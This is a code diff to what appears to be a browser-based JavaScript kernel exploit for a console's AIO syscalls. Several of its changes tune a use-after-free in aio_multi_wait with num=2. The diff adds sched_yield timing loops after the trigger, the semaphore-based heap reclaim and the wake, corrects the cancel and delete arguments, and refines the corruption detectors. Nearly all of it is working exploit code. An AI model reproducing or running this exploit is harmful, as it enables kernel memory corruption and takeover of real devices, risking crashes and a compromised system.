@@ -365,12 +365,25 @@
             return { label: label, nr: nr, ok: d.ok, errno: d.errno, errName: d.errName, ret: ret, ms: ms };
         } catch (e) {
             var why = String((e && e.message) || e).slice(0, 110);
-            out(label, "THREW " + why, "err");
+            /* quiet stays quiet on throws too: settle() loops call this hundreds of times,
+             * and 1300 identical THREW rows would flush the panel log buffer and evict the
+             * tile output the operator is supposed to read. A quiet caller checks its own
+             * last result if it cares. */
+            if (!quiet) out(label, "THREW " + why, "err");
             return { label: label, nr: nr, threw: why, ok: false };
         }
     }
 
     function B(x) { return (typeof x === "bigint") ? x : BigInt(x); }
+    /* settle(): sched_yield in a loop, SILENTLY. The AIO completion path and the waker
+     * run on kernel worker threads; a JS thread that never yields can read the detectors
+     * before the waker has run at all -- BragaTy/Wamphyre's bagagwa_uaf_1320.js yields
+     * 200x after the shot, 500x after reclaim and 500x after the wake, and that timing
+     * discipline is exactly what our 11:21 "no observable effect" run was missing. quiet
+     * because 1300 S() rows would flush the panel log buffer and evict the tile output. */
+    function settle(n) {
+        for (var i = 0; i < n; i++) S("sched_yield", 0x14B, [], true, true);
+    }
     function malloc(sz) { return B(window.malloc(sz)); }
     function zeros(ptr, n) {
         var z = new Uint8Array(n);
@@ -1020,14 +1033,19 @@
                 + (w.errName ? " (" + w.errName + ")" : "")
                 + " -- num=1 can never reproduce the UAF (that needs num>=2 in ONE call)", "dim");
 
-            /* Wake: complete the pending reads so nothing stays armed behind us. */
+            /* Wake: complete the pending reads so nothing stays armed behind us.
+             * sched_yield settle after: same kernel-worker timing argument as pArm. */
             var one = malloc(0x10);
             window.write_buffer(one, new Uint8Array([0x41]));
             S("write(wfd,1)", 0x004, [BigInt(sfd[1]), one, 1n]);
+            settle(100);
 
-            /* Cleanup: cancel then delete with the SAME pointer and num=1. */
-            var c = S("aio_multi_cancel(ids,1)", 0x29A, [ids, 1n, 0n], true);
-            var d = S("aio_multi_delete(ids,1)", 0x296, [ids, 1n, 0n], true);
+            /* Cleanup: cancel then delete with the SAME pointer, num=1, and a REAL states
+             * buffer (PSAITO 3-arg shape: states is dereferenced at num>=1; the old
+             * hardwired 0 would EFAULT and leave the requests behind). */
+            var stClean = zeros(malloc(0x20), 0x20);
+            var c = S("aio_multi_cancel(ids,1,states)", 0x29A, [ids, 1n, stClean], true);
+            var d = S("aio_multi_delete(ids,1,states)", 0x296, [ids, 1n, stClean], true);
             S("close w", 0x006, [BigInt(sfd[1])]);   /* fd labels verified against T2's pipe2: sfd[0] is the read end */
             S("close r", 0x006, [BigInt(sfd[0])]);
 
@@ -1036,6 +1054,7 @@
                 + ", cancel=" + (c.ret === undefined ? c.threw : hex(c.ret)) + (c.errName ? " (" + c.errName + ")" : "")
                 + ", delete=" + (d.ret === undefined ? d.threw : hex(d.ret)) + (d.errName ? " (" + d.errName + ")" : "")
                 + ". This settles what the armed call will see: whether ids from submit are raw handles "
+                + "(wait ESRCH-free) or need an indirection, and which of mode/timeout positions the "
                 + "kernel accepts. What it can NEVER do is arm the UAF -- every call here had num<=1, "
                 + "and the corruption needs num>=2 in ONE call. That step stays behind your explicit go.", "ok");
             notify("bagagwa T3b live request: wait=" + (w.ret === undefined ? "threw" : hex(w.ret)) + " on " + FW);
@@ -1518,13 +1537,20 @@
             window.write_buffer(witness60, wr60);
             var w60snap = new Uint8Array(window.read_buffer(witness60, 0x60));
 
-            /* -- THE ARMED CALL: num = 2. THE UAF. From here a failure is a POWER CYCLE -- */
+            /* THE ARMED CALL: num = 2. THE UAF. From here a failure is a POWER CYCLE.
+             * After the shot, settle with sched_yield (0x14B, a proven 13.60 stub): the
+             * AIO completion and the waker run on KERNEL worker threads, and a JS thread
+             * that never yields may read the detectors before the waker has run at all.
+             * BragaTy/Wamphyre's bagagwa_uaf_1320.js yields 200x here, 500x after reclaim
+             * and 500x after the wake -- that timing discipline is the main difference
+             * between our 11:21 'no observable effect' and a real measurement. */
             notify("bagagwa: ARMING aio_multi_wait num=2 -- possible freeze; wait or power cycle");
             var wargs = [ids, 2n, 0n, 0n, 0n];              /* (ids, num=2, states=NULL, mode=0, timeout=0) */
             var w = null, threw = null;
             try { w = S("aio_multi_wait(ids, num=2) -- THE UAF", 0x297, wargs); }
             catch (e) { threw = String((e && e.message) || e).slice(0, 90); }
             out("ARM-wait", "num=2 returned " + (w && w.ret !== undefined ? hex(w.ret) + (w.errName ? " (" + w.errName + ")" : "") : (threw || "threw")), w && w.ret !== undefined && B(w.ret) === 0n ? "ok" : "warn");
+            settle(200);                                    /* let kernel workers run */
 
             /* -- RECLAIM BEFORE THE WAKE. The waker runs at WAKE time, walking req->waiters
              *    through whatever now occupies the freed array -- so the reclaim must be in
@@ -1544,11 +1570,13 @@
                 if (wi < 4) names.push({ nm: nm, buf: buf });
                 S("osem_create(" + nm + ")", 0x225, [buf, 0n, 1n, 1n, 0n]);
             }
+            settle(500);                                    /* reclaim lands */
 
             /* -- wake: complete the pending reads; the waker then walks req->waiters -- */
             var one = malloc(0x10);
             window.write_buffer(one, new Uint8Array([0x41]));
             S("write(wfd,1) wake", 0x004, [BigInt(wfd), one, 1n]);
+            settle(500);                                    /* waker walks req->waiters */
 
             /* -- detect: sentinels first, then the name strings, then the witnesses -- */
             var c1 = B(window.read64(cell1)), c2 = B(window.read64(cell2));
@@ -1562,10 +1590,14 @@
             var w60now = new Uint8Array(window.read_buffer(witness60, 0x60));
             var witnessHit = false; for (var wi2 = 0; wi2 < 0x60; wi2++) if (w60now[wi2] !== w60snap[wi2]) { witnessHit = true; break; }
 
-            /* -- cleanup: cancel+delete the requests, close the pair; reclaim osems stay alive.
+            /* -- cleanup: cancel+delete with the PSAITO-proven 3-arg shape (ids, num, states).
+             *    The 11:21 run's cancel/delete EFAULT was our own states=NULL -- the same
+             *    measured-ABI fact that ate the armed call. num=2 covers both requests, and
+             *    a 0 return here is also POST-ARM PROOF the kernel still accepts our ids.
              *    fd labels verified against T2's pipe2 semantics: rd[0] is the READ end. -- */
-            S("aio_multi_cancel(ids,1)", 0x29A, [ids, 1n, 0n], true);
-            S("aio_multi_delete(ids,1)", 0x296, [ids, 1n, 0n], true);
+            var statesCleanup = zeros(malloc(0x20), 0x20);
+            S("aio_multi_cancel(ids,2,states)", 0x29A, [ids, 2n, statesCleanup], true);
+            S("aio_multi_delete(ids,2,states)", 0x296, [ids, 2n, statesCleanup], true);
             S("close r", 0x006, [BigInt(rfd)]);
             S("close w", 0x006, [BigInt(wfd)]);
 
